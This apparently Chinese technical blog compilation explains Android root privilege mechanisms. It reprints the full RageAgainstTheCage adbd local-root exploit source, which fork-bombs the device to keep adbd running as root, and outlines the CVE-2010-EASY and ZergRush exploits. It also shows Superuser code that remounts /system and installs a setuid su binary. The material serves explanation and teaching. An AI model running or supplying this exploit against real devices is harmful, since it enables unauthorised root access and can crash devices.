\u8fd9\u65f6\u91cd\u65b0\u7528adb\u8fde\u63a5\u8bbe\u5907\uff0c\u5219adb\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 \u901a\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u53d1\u73b0\u5229\u7528RageAgainstTheCage\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4f7fadbd\u83b7\u5f97root\u6743\u9650\uff0c\u4e5f\u5c31\u662fadb\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u62ff\u5230root\u6743\u9650\u5269\u4e0b\u7684\u95ee\u9898\u5c31\u597d\u529e\u4e86\uff0c\u590d\u5236\u7834\u89e3\u4e4b\u540e\u7684su\u7a0b\u5e8f\u5230\u7cfb\u7edf\u4e2d\uff0c\u90fd\u662f\u6ca1\u6709\u4ec0\u4e48\u6280\u672f\u542b\u91cf\u7684\u4e8b\u60c5\u4e86\u3002 \u5176\u5b9e\u5835\u4f4fadbd\u7684\u8fd9\u4e2a\u6f0f\u6d1e\u5176\u5b9e\u4e5f\u633a\u7b80\u5355\u7684\uff0c\u65b0\u7248\u672c\u5df2\u7ecf\u52a0\u4e24\u4e2a\u8fd9\u4e2a\u8865\u4e01\u3002 1:/* then switch user and group to \"shell\" */ 2:if (setgid(AID_SHELL) != 0) { 3: exit(1); 4: } 5:if (setuid(AID_SHELL) != 0) { 6: exit(1); 7: } \u5982\u679c\u53d1\u73b0setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u5219adbd\u8fdb\u7a0b\u5f02\u5e38\u9000\u51fa\uff0c\u5c31\u628a\u8fd9\u4e2a\u6f0f\u6d1e\u7ed9\u5835\u4e0a\u4e86\u3002 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2607 http://blog.claudxiao.net/wp-content/uploads/2011/04/rageagainstthecage.c /* android 1.x/2.x adb setuid() root exploit * (C) 2010 The Android Exploid Crew * * Needs to be executed via adb -d shell. It may take a while until * all process slots are filled and the adb connection is reset. * * !!!This is PoC code for educational purposes only!!! * If you run it, it might crash your device and make it unusable! * So you use it at your own risk! */ #include <stdio.h> #include <sys/types.h> #include <sys/time.h> #include <sys/resource.h> #include <unistd.h> #include <fcntl.h> #include <errno.h> #include <string.h> #include <signal.h> #include <stdlib.h> void die(const char *msg) { perror(msg); exit(errno); } pid_t find_adb() { char buf[256]; int i = 0, fd = 0; pid_t found = 0; for (i = 0; i < 32000; ++i) { sprintf(buf, \"/proc/%d/cmdline\", i); if ((fd = open(buf, O_RDONLY)) < 0) continue; memset(buf, 0, sizeof(buf)); read(fd, buf, sizeof(buf) - 1); close(fd); if (strstr(buf, \"/sbin/adb\")) { found = i; break; } } return found; } void restart_adb(pid_t pid) { kill(pid, 9); } void wait_for_root_adb(pid_t old_adb) { pid_t p = 0; for (;;) { p = find_adb(); if (p != 0 && p != old_adb) break; sleep(1); } sleep(5); kill(-1, 9); } int main(int argc, char **argv) { pid_t adb_pid = 0, p; int pids = 0, new_pids = 1; int pepe[2]; char c = 0; struct rlimit rl; printf(\"[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\\n\\n\"); printf(\"[*] checking NPROC limit ...\\n\"); if (getrlimit(RLIMIT_NPROC, &rl) < 0) die(\"[-] getrlimit\"); if (rl.rlim_cur == RLIM_INFINITY) { printf(\"[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\\n\"); exit(1); } printf(\"[+] RLIMIT_NPROC={%lu, %lu}\\n\", rl.rlim_cur, rl.rlim_max); printf(\"[*] Searching for adb ...\\n\"); adb_pid = find_adb(); if (!adb_pid) die(\"[-] Cannot find adb\"); printf(\"[+] Found adb as PID %d\\n\", adb_pid); printf(\"[*] Spawning children. Dont type anything and wait for reset!\\n\"); printf(\"[*]\\n[*] If you like what we are doing you can send us PayPal money to\\n\" \"[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\\n\" \"[*] If you are a company and feel like you profit from our work,\\n\" \"[*] we also accept donations > 1000 USD!\\n\"); printf(\"[*]\\n[*] adb connection will be reset. restart adb server on desktop and re-login.\\n\"); sleep(5); if (fork() > 0) exit(0); setsid(); pipe(pepe); /* generate many (zombie) shell-user processes so restarting * adb's setuid() will fail. * The whole thing is a bit racy, since when we kill adb * there is one more process slot left which we need to * fill before adb reaches setuid(). Thats why we fork-bomb * in a seprate process. */ if (fork() == 0) { close(pepe[0]); for (;;) { if ((p = fork()) == 0) { exit(0); } else if (p < 0) { if (new_pids) { printf(\"\\n[+] Forked %d childs.\\n\", pids); new_pids = 0; write(pepe[1], &c, 1); close(pepe[1]); } } else { ++pids; } } } close(pepe[1]); read(pepe[0], &c, 1); restart_adb(adb_pid); if (fork() == 0) { fork(); for (;;) sleep(0x743C); } wait_for_root_adb(adb_pid); return 0; } Android\u7a0b\u5e8f\u7684\u5b89\u5168\u7cfb\u7edf \u5728Android\u7cfb\u7edf\u4e2d\uff0c\u7cfb\u7edf\u4e3a\u6bcf\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff08apk\uff09\u521b\u5efa\u4e86\u4e00\u4e2a\u7528\u6237\u548c\u7ec4\u3002\u8fd9\u4e2a\u7528\u6237\u548c\u7ec4\u90fd\u662f\u53d7\u9650\u7528\u6237\uff0c\u4e0d\u80fd\u8bbf\u95ee\u7cfb\u7edf\u7684\u6570\u636e\uff0c\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u5f53\u7136\u5b83\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\u8fd9\u6837\u8bbe\u8ba1\u53ef\u4ee5\u5c3d\u53ef\u80fd\u5730\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u548c\u5065\u58ee\u6027\u3002 \u4f46\u662f\u6709\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u662f\u9700\u8981\u8bbf\u95ee\u4e00\u4e9b\u7cfb\u7edf\u8d44\u6e90\u7684\u3002\u6bd4\u5982Setting\u7a0b\u5e8f\uff0c\u5b83\u9700\u8981\u8bbf\u95eeWiFi\uff0c\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u5220\u9664\u6587\u4ef6\u7b49\u7b49\u64cd\u4f5c\u3002\u600e\u6837\u505a\u5230\u8fd9\u4e00\u70b9\u513f\u5462\uff1fAndroid\u901a\u8fc7\u4e00\u5b9a\u9014\u5f84\u53ef\u4ee5\u83b7\u5f97system\u6743\u9650\u3002\u83b7\u5f97system\u7528\u6237\u6743\u9650\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u4e00\u822c\u60c5\u51b5\u4e0bsystem\u7528\u6237\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u548c\u5220\u9664\u6587\u4ef6\uff0c\u8bbf\u95ee\u8bbe\u5907\u7b49\u7b49\u3002\u4f46\u662f\u6709\u4e9b\u60c5\u51b5\u4e0bsystem\u6743\u9650\u8fd8\u662f\u4e0d\u591f\u7684\u3002\u6bd4\u5982\uff1a\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0cifconfig\u547d\u4ee4\u662f\u9700\u8981root\u6743\u9650\u7684\u3002\u6211\u53ef\u4ee5\u5f88\u80af\u5b9a\u7684\u8bf4\uff0c\u5728Android\u4e0b\u9762\u5e94\u7528\u7a0b\u5e8f\u662f\u6ca1\u6709\u53ef\u80fd\u62ff\u5230root\u6743\u9650\u7684\u3002\u4f46\u662f\u5982\u679c\u6211\u7684\u5e94\u7528\u7a0b\u5e8f\u9700\u8981root\u6743\u9650\u600e\u4e48\u529e\u5462\uff1f\u53ea\u80fd\u60f3\u529e\u6cd5\u7ed5\u822c\u8fc7\u53bb\u3002\u5c31\u4ee5\u6211\u7684\u95ee\u9898\u4e3a\u4f8b\uff0c\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0croot\u6743\u9650\u4e0b\u9762\u547d\u4ee4\u4e3a\uff1a ifconfig eth0 192.168.1.188 \u5728\u666e\u901a\u7528\u6237\u6216\u8005system\u7528\u6237\u6743\u9650\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fd4\u56de\u5931\u8d25\u548c\u5f02\u5e38\uff0c\u90a3\u4e48\u600e\u6837\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u5462\u3002 1\u3001\u7cfb\u7edf\u542f\u52a8\u7684\u65f6\u5019init\u8fdb\u7a0b\u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u5904\u4e8eroot\u7528\u6237\u6743\u9650\u4e0b\u9762\u3002\u7528\u6765\u76d1\u542c\u7cfb\u7edf\u4e2d\u5e94\u7528\u7a0b\u5e8f\u7684\u8bf7\u6c42\uff08\u53ef\u4ee5\u7528socket\u5b9e\u73b0\uff09\uff0c\u5e76\u4ee3\u5176\u5b8c\u6210\u3002\u8fd9\u6837\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u6267\u884croot\u7528\u6237\u6743\u9650\u7684\u4efb\u52a1\u4e86\u3002 2\u3001\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u7684\u8bbe\u5907\uff0c\u8be5\u8bbe\u5907\u7684\u529f\u80fd\u5c31\u662f\u5728\u5185\u6838\u6001\u5e2e\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u76f8\u5e94\u7684\u547d\u4ee4\u3002Linux\u5185\u6838\u6001\u6ca1\u6709\u6743\u9650\u7684\u95ee\u9898\u4e86\u3002\u80af\u5b9a\u53ef\u4ee5\u6267\u884c\u6210\u529f\u3002 \u89e3\u51b3\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\u95ee\u9898\u65f6\uff0c\u9009\u62e9\u662f\u540e\u8005\u76f8\u5bf9\u6765\u8bf4\u8bbe\u8ba1\u6bd4\u8f83\u7b80\u5355\u3002 Android\u5e94\u7528\u7a0b\u5e8f\u5229\u7528init.rc service\u83b7\u5f97root\u6743\u9650 \u53d1\u5e03\u4e8e: \u60f3\u5728android\u5e94\u7528\u7a0b\u5e8f\u4e2d\u52a8\u6001mount\u4e00\u4e2aNFS\u7684\u7cfb\u7edf\uff0c\u4f46\u662f\u6267\u884cmount\u547d\u4ee4\u5fc5\u987b\u8981root\u6743\u9650\u624d\u53ef\u4ee5\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5728Android\u7684APK\u5c42\u662f\u4e0d\u80fd\u83b7\u5f97root\u6743\u9650\u7684\u3002 \u4e0a\u4e00\u8282\u63d0\u5230\u5b9e\u73b0\u7531init\u542f\u52a8\u7684Service\uff0c\u6765\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u6216\u8005\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u8bbe\u5907\uff0c\u8fd9\u4e2a\u8bbe\u5907\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002 \u672c\u6587\u5c06\u4f1a\u9009\u62e9\u7b2c\u4e00\u79cd\u6765\u89e3\u51b3Android\u5e94\u7528\u7a0b\u5e8fmount NFS\u6587\u4ef6\u7cfb\u7edf\u7684\u95ee\u9898\u3002 Init.rc Service \u5728Android\u7cfb\u7edfinit.rc\u4e2d\u5b9a\u4e49\u5f88\u591aService\uff0cInit.rc\u4e2d\u5b9a\u4e49\u7684Service\u5c06\u4f1a\u88abInit\u8fdb\u7a0b\u521b\u5efa\uff0c\u8fd9\u6837\u5c06\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650\u3002 \u8bbe\u7f6e\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\uff0c\u628a\u201cctl.start\u201d\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8fd0\u884c\u7684Service\uff0c\u5047\u8bbe\u4e3a\u201cxxx\u201d\uff0cAndroid\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u4f60\u8fd0\u884c\u201cctl.start\u201d\u7cfb\u7edf\u5c5e\u6027\u4e2d\u6307\u5b9a\u7684Service\u3002\u90a3\u4e48\u8fd0\u884c\u7ed3\u679cinit\u8fdb\u7a0b\u4f1a\u5199\u5165\u547d\u540d\u4e3a\u201cinit.svc.+xxx\u201d\u7684\u7cfb\u7edf\u5c5e\u6027\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u53c2\u8003\u67e5\u9605\u8fd9\u4e2a\u503c\u6765\u786e\u5b9aService xxx\u6267\u884c\u7684\u60c5\u51b5\u3002 Android\u7cfb\u7edf\u5c5e\u6027(property)\u6743\u9650 \u96be\u9053Android\u5c5e\u6027\u201cctl.start\u201d\u4e0d\u662f\u6240\u6709\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u8bbe\u7f6e\u7684\uff0c\u89c1property_service.c\u4e2d\u7684\u6e90\u7801\uff0c\u8bbe\u7f6eAndroid\u7cfb\u7edf\u5c5e\u6027\u7684\u51fd\u6570\u4e3ahandle_property_set_fd(),\u4ece\u6e90\u7801\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u8bbe\u7f6e\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\uff0c\u5c06\u4f1a\u8c03\u7528check_control_perms\u51fd\u6570\u6765\u68c0\u67e5\u8c03\u7528\u8005\u7684\u6743\u9650\uff0c\u53ea\u6709root\u6743\u9650\u548csystem\u6743\u9650\u7684\u5e94\u7528\u7a0b\u5e8f\u624d\u53ef\u4ee5\u4fee\u6539\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\u3002\u5426\u5219\u5c06\u4f1a\u68c0\u67e5control_perms\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u5b9a\u4e49\u6743\u9650\u548cService\u3002 \u4ece\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u4efb\u4f55\u4e0d\u4ee5property_perms[] \u4e2d\u5b9a\u4e49\u7684\u524d\u7f00\u5f00\u5934\u7684property \u662f\u65e0\u6cd5\u88ab\u9664root\u4ee5\u5916\u7684\u7528\u6237\u8bbf\u95ee\u7684\uff0c\u5305\u62ecsystem\u7528\u6237\u3002 \u5b9e\u4f8b \u4e0b\u9762\u4ee5\u4e0a\u9762\u63d0\u51fa\u7684mount nfs\u6587\u4ef6\u7cfb\u7edf\u4e3a\u4f8b\u8bf4\u660e\uff1a A\uff0e \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u6267\u884cmount\u7684\u811a\u672c\uff0c\u6211\u628a\u5b83\u4f4d\u4e8e/system/etc/mount_nfs.sh\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: #\uff01/system/bin/sh 2: 3: /system/bin/busybox mount -o rw,nolock -t nfs 192.168.1.6:/nfs_srv /data/mnt \u4e0d\u8981\u5fd8\u4e86\u628a\u5b83\u52a0\u4e0a\u53ef\u6267\u884c\u6743\u9650\u3002 B\uff0e \u5728init.rc\u4e2d\u52a0\u5165\u4e00\u4e2aService\u5b9a\u4e49\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: service mount_nfs /system/etc/mount_nfs.sh 2: oneshot 3: disabled C\uff0e \u8ba9\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u83b7\u5f97system\u6743\u9650,\u65b9\u6cd5\u89c1\u524d\u9762\u7ae0\u8282 D. \u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8bbe\u7f6eSystem\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\u4e3a\u201cmount_nfs\u201d\uff0c\u8fd9\u6837Android\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u6211\u4eec\u8fd0\u884cmount_nfs\u7cfb\u7edf\u5c5e\u6027\u4e86\u3002\u4e0d\u80fd\u591f\u8c03\u7528System.getProperty\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u4fee\u6539JVM\u4e2d\u7684\u7cfb\u7edf\u5c5e\u6027\u3002\u53ea\u80fd\u8c03\u7528android.os.SystemProperties\uff0c\u6700\u7ec8\u901a\u8fc7JNI\u8c03\u7528C/C++\u5c42\u7684API property_get\u548cproperty_set\u51fd\u6570\u3002 SystemProperties.set(\"ctl.start\",\"mount_nfs\"); E. \u6700\u540e\u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u8bfb\u53d6\u201cinit.svc.mount_nfs\u201dAndroid\u7cfb\u7edfProperty\uff0c\u68c0\u67e5\u6267\u884c\u7ed3\u679c\u3002\u4ee3\u7801\u5982\u4e0b\uff1a 1:while(true) 2: { 3: mount_rt = SystemProperties.get(\"init.svc.mount_nfs\",\"\"); 4: if(mount_rt != null && mount_rt.equals(\"stopped\")) 5: { 6: return true; 7: } 8: 9: try 10: { 11: Thread.sleep(1000); 12: }catch(Exception ex){ 13: Log.e(TAG,\"Exception: \" + ex.getMessage()); 14: } 15: } init\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2aservice\u7684\u961f\u5217\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8f6e\u8bad\u6765\u67e5\u8be2service\u7684\u6267\u884c\u7ed3\u679c\u3002 1. \u6587\u4ef6(\u5939)\u8bfb\u5199\u6743\u9650 init.rc \u4e2d\u5efa\u7acbtest1 test2 test3\u6587\u4ef6\u5939 mkdir /data/misc/test1 0770 root root mkdir /data/misc/test2 0770 wifi wifi mkdir /data/misc/test3 0770 system misc \u5176\u4e2d test1 \u76ee\u5f55\u7684owner\u662froot, group\u4e5f\u662froot test2 \u76ee\u5f55\u7684owner\u662fwifi , group\u4e5f\u662fwifi test3 \u76ee\u5f55\u7684owner\u662fsystem , group\u662fmisc \uff08\u4efb\u4f55\u7528\u6237\u90fd\u5c5e\u4e8egroup misc\uff09 service xxxx /system/bin/xxxx user root disabled oneshot service yyyy /system/bin/yyyy user system disabled oneshot service zzzz /system/bin/zzzz user wifi disabled oneshot \u7ed3\u679c: xxxx \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test1, test2, test3 yyyy \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test3 zzzz \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test2, test3 \u89c1android_filesystem_config.h\u4e2d\u5b9a\u4e49AID_ROOT AID_SYSTEM AID_MISC\u7b49\u5b8f\u5b9a\u4e49\u7684\u6743\u9650 360\u7b49\u7279\u6b8a\u7cfb\u7edf\u662f\u5426\u53ef\u4ee5\u8003\u8651\u5728AID_ROOT\u548cAID_SYSTEM\u4e4b\u95f4\u52a0\u4e00\u4e2a\u6743\u9650\u548c\u7528\u6237,\u589e\u52a0\u65b0\u7684\u54e6 property\u7ed9360\u7528?**** \u901a\u8fc7\u4e0a\u9762\u7684\u8fd9\u4e9b\u6b65\u9aa4\uff0cAndroid\u5e94\u7528\u7a0b\u5e8f\u5c31\u80fd\u591f\u8c03\u7528init.rc\u4e2d\u5b9a\u4e49\u7684Service\u4e86\u3002\u8fd9\u6837\u4f60\u7684Android\u5e94\u7528\u7a0b\u5e8f\u4e5f\u5c31\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u524d\u63d0\u662fAndroid\u7cfb\u7edf\u5f00\u53d1\u4eba\u5458\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u4fee\u6539init.rc\u7b49\u6587\u4ef6,\u800c\u4e14\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u8981\u83b7\u5f97system\u6743\u9650\u3002 android superuser.apk\u7ba1\u7406root\u6743\u9650\u539f\u7406\u5206\u6790 \u539f\u7406\u662f\u5229\u7528\u4e86android\u7684\u4e24\u4e2a\u63d0\u6743\u6f0f\u6d1e\uff1a CVE-2010-EASY\u548c ZergRush\u3002 \u6211\u628a\u5927\u6982\u539f\u7406\u7b80\u5355\u8bf4\u8bf4\uff1a 1\uff0c CVE-2010-EASY\uff1a linux\u7684\u5185\u6838\u7684\u6a21\u5757\u5316\u7a0b\u5ea6\u5f88\u9ad8\uff0c\u5f88\u591a\u529f\u80fd\u6a21\u5757\u662f\u9700\u8981\u5230\u65f6\u5019\u518d\u52a0\u8f7d\uff0c\u5728 android\u4e2d\u7531init\u8fdb\u7a0b\u6765\u7ba1\u7406\u8fd9\u4e9b\u7684\u3002\u4f46\u662f\u8fd9\u4e2ainit\u8fdb\u7a0b\u4e0d\u4f1a\u68c0\u6d4b\u53d1\u7ed9\u5b83\u7684\u6307\u4ee4\u7684\u6765\u6e90\uff0c\u4e0d\u7ba1\u662f\u5185\u6838\u53d1\u9001\u7684\uff0c\u8fd8\u662f\u7528\u6237\u53d1\u9001\u7684\uff0c\u5b83\u90fd\u6267\u884c\u4e0d\u8bef\uff0c\u4f1a\u987a\u4ece\u7684\u53bb\u52a0\u8f7d\u6216\u5378\u8f7d\u4e00\u4e9b\u6a21\u5757\uff0c\u800c\u52a0\u8f7d\u7684\u6a21\u5757\u90fd\u662f\u4ee5root\u8eab\u4efd\u8fd0\u884c\u7684\u3002\u56e0\u6b64\u4f60\u53ef\u4ee5\u7ed9\u5b83\u51c6\u5907\u4e00\u4e2a\u7cbe\u5fc3\u5236\u4f5c\u7684\u529f\u80fd\u6a21\u5757(ko\u6587\u4ef6)\uff0c\u7136\u540e\u89e6\u53d1\u76f8\u5e94\u7684\u52a0\u8f7d\u6761\u4ef6\uff0c\u6bd4\u5982\u70ed\u62d4\u63d2\u3001\u5f00\u5173wifi\u7b49\u7b49\uff0c \u8be5\u529f\u80fd\u6a21\u5757\u8fd0\u884c\u540e\uff0c\u4f1a\u751f\u6210 /data/local/tmp/rootshell \u4e00\u4e2a\u5e26s\u4f4d\u7684shell\u3002 2\uff0cZergRush\u539f\u7406\uff1a \u5177\u6709root\u6743\u9650\u7684vold\u8fdb\u7a0b\u4f7f\u7528\u4e86libsysutils.so\u5e93\uff0c\u8be5\u5e93\u6709\u4e2a\u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u56e0\u6b64\u53ef\u4ee5root\u6743\u9650\u6267\u884c\u8f93\u5165\u7684shellcode\u3002 3. \u8fd8\u6709\u4e2a\u524d\u9762\u63d0\u5230\u7684adb\u63d0\u6743\u6f0f\u6d1e\uff0c\u4e0d\u591f\u65b0\u7248\u672c\u5df2\u7ecf\u4fee\u6b63\u4e86\u3002 \u626f\u4e86\u534a\u5929\u8fd8\u6ca1\u626f\u5230superuser.apk\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u662froot\u6210\u529f\u540e\uff0c\u4e13\u95e8\u7528\u6765\u7ba1\u7406root\u6743\u9650\u4f7f\u7528\u7684\uff0c\u9632\u6b62\u88ab\u6076\u610f\u7a0b\u5e8f\u6ee5\u7528\u3002 \u6e90\u7801\u5730\u5740\uff1a http://superuser.googlecode.com/svn/trunk \u5e26\u7740\u4e24\u4e2a\u95ee\u9898\u6211\u4eec\u6765\u5206\u6790\u6e90\u7801\uff1a 1\u3001superuser\u662f\u600e\u4e48\u77e5\u9053\u8c01\u60f3\u7528root\u6743\u9650\uff1f 2\u3001superuser\u662f\u5982\u4f55\u628a\u7528\u6237\u7684\u9009\u62e9\u544a\u8bc9su\u7a0b\u5e8f\u7684\u90a3\uff1f \u5373superuser\u548csu\u7a0b\u5e8f\u662f\u5982\u4f55\u901a\u8baf\u7684\uff0c\u4ed6\u4eec\u4fe9\u4f4d\u4e8e\u4e0d\u901a\u7684\u65f6\u7a7a\uff0c\u4e00\u4e2a\u5728java\u865a\u62df\u673a\u4e2d\uff0c\u4e00\u4e2a\u5728linux\u7684\u771f\u5b9e\u8fdb\u7a0b\u4e2d\u3002 \u5171\u6709\u4e24\u4e2aactive: SuperuserActivity\u548c SuperuserRequestActivity\u3002 \u5176\u4e2dSuperuserActivity\u4e3b\u8981\u662f\u7528\u6765\u7ba1\u7406\u767d\u540d\u5355\u7684\uff0c\u5c31\u662f\u8bb0\u4f4f\u54ea\u4e2a\u7a0b\u5e8f\u5df2\u7ecf\u88ab\u5141\u8bb8\u4f7f\u7528root\u6743\u9650\u4e86\uff0c\u7701\u7684\u6bcf\u6b21\u7528\u65f6\u90fd\u95ee\u7528\u6237\u3002 SuperuserRequestActivity \u5c31\u662f\u7528\u6765\u8be2\u95ee\u7528\u6237\u76ee\u524d\u6709\u4e2a\u7a0b\u5e8f\u60f3\u4f7f\u7528root\u6743\u9650\uff0c\u662f\u5426\u5141\u8bb8\uff0c\u662f\u5426\u4e00\u76f4\u5141\u8bb8\uff0c\u5373\u653e\u5165\u767d\u540d\u5355\u3002 \u8fd9\u4e2a\u767d\u540d\u5355\u6bd4\u8f83\u5173\u952e\uff0c\u662f\u4e00\u4e2asqlite\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u4f4d\u7f6e\uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite root\u7684\u672c\u8d28\u5c31\u662f\u5f80 /system/bin/\u4e0b\u653e\u4e00\u4e2a\u5e26s\u4f4d\u7684\uff0c\u4e0d\u68c0\u67e5\u8c03\u7528\u8005\u6743\u9650\u7684su\u6587\u4ef6\u3002\u666e\u901a\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u8be5su\u6765\u8fd0\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002superuser.apk\u4e2d\u5c31\u81ea\u5e26\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684su\u7a0b\u5e8f\u3002\u4e00\u5f00\u59cbsuperuser\u4f1a\u68c0\u6d4b/system/bin/su\u662f\u5426\u5b58\u5728\uff0c\u662f\u5426\u662f\u81ea\u4e2a\u653e\u8fdb\u53bb\u7684su: File su = new File(\"/system/bin/su\"); // \u68c0\u6d4bsu\u6587\u4ef6\u662f\u5426\u5b58\u5728,\u5982\u679c\u4e0d\u5b58\u5728\u5219\u76f4\u63a5\u8fd4\u56de if (!su.exists()) { Toast toast = Toast.makeText(this, \"Unable to find /system/bin/su.\", Toast.LENGTH_LONG); toast.show(); return; } //\u68c0\u6d4bsu\u6587\u4ef6\u7684\u5b8c\u6574\u6027\uff0c\u6bd4\u8f83\u5927\u5c0f\uff0c\u592a\u7701\u4e8b\u4e86\u5427 //\u5982\u679c\u5927\u5c0f\u4e00\u6837\uff0c\u5219\u8ba4\u4e3asu\u6587\u4ef6\u6b63\u786e\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86\u4e8b\u3002 if (su.length() == suStream.available()) { suStream.close(); return; } // \u5982\u679c\u68c0\u6d4b\u5230/system/bin/su \u6587\u4ef6\u5b58\u5728\uff0c\u4f46\u662f\u4e0d\u5bf9\u5934\uff0c\u5219\u628a\u81ea\u5e26\u7684su\u5148\u5199\u5230\"/data/data/com.koushikdutta.superuser/su\" // \u518d\u5199\u5230/system/bin/su\u3002 byte[] bytes = new byte[suStream.available()]; DataInputStream dis = new DataInputStream(suStream); dis.readFully(bytes); FileOutputStream suOutStream = new FileOutputStream(\"/data/data/com.koushikdutta.superuser/su\"); suOutStream.write(bytes); suOutStream.close(); Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os = new DataOutputStream(process.getOutputStream()); os.writeBytes(\"mount -oremount,rw /dev/block/mtdblock3 /system\\n\"); os.writeBytes(\"busybox cp /data/data/com.koushikdutta.superuser/su /system/bin/su\\n\"); os.writeBytes(\"busybox chown 0:0 /system/bin/su\\n\"); os.writeBytes(\"chmod 4755 /system/bin/su\\n\"); os.writeBytes(\"exit\\n\"); os.flush(); \u4e0a\u9762\u63d0\u5230\u7684su\u80af\u5b9a\u662f\u52a8\u8fc7\u624b\u811a\u7684,\u6709\u8fdb\u7a0b\u4f7f\u7528root\u6743\u9650\uff0csuperuser\u662f\u600e\u4e48\u77e5\u9053\u7684\uff0c\u770b\u5b8csu\u7684\u4ee3\u7801\u660e\u767d\u4e86\uff0c\u5173\u952e\u662f\u53e5\uff1a sprintf(sysCmd, \"am start -a android.intent.action.MAIN -n com.koushikdutta.superuser/com.koushikdutta.superuser.SuperuserRequestActivity --ei uid %d --ei pid %d > /dev/null\", g_puid, ppid); if (system(sysCmd)) return executionFailure(\"am.\"); \u539f\u7406\u662fam\u547d\u4ee4\uff0c\u770b\u4e86\u4e0bam\u7684\u7528\u6cd5\uff0c\u660e\u767d\u4e86\uff1a 